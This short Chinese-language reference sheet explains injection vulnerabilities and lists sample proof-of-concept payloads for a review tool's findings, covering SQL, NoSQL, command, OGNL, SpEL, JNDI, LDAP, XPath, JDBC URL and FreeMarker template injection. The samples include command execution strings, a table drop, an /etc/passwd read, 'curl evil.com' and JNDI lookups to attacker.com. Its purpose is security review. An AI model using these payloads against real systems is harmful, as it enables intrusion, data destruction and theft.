# Injection Family（SQL / NoSQL / Command / Code / LDAP / XPath / Template / SpEL / JNDI / JDBC URL Injection）

## 共性

所有 Injection 类漏洞的本质都是：**结构化语句的"语法层"和"数据层"被混淆**。
攻击者输入控制了 sink 的"指令字符串"而不仅是"数据值"，因此能改变指令含义。

## PoC 模板（VULNERABLE 时填 attack_vector / poc_payload）

| Injection 类型 | poc_payload 示例 |
|---|---|
| SQL Injection | `' OR '1'='1` / `' UNION SELECT user,pwd FROM users--` / `'; DROP TABLE x;--` |
| NoSQL Injection (MongoDB) | `{"$ne": null}` / `{"$where": "this.password.length > 0"}` |
| Command Injection | `; cat /etc/passwd` / `\` whoami\`` / `$(curl evil.com/x)` |
| Code Injection (OGNL) | `@java.lang.Runtime@getRuntime().exec("id")` |
| SpEL Injection | `T(java.lang.Runtime).getRuntime().exec("id")` |
| JNDI Injection | `ldap://attacker.com/Exploit` / `rmi://attacker.com/Exploit` |
| LDAP Injection | `*` / `*)(uid=*` |
| XPath Injection | `' or '1'='1` (同 SQL 思路) |
| JDBC URL Injection | `jdbc:h2:mem:;INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws ...'` |
| Template Injection (FreeMarker) | `<#assign x = 'freemarker.template.utility.Execute'?new()>${x("id")}` |
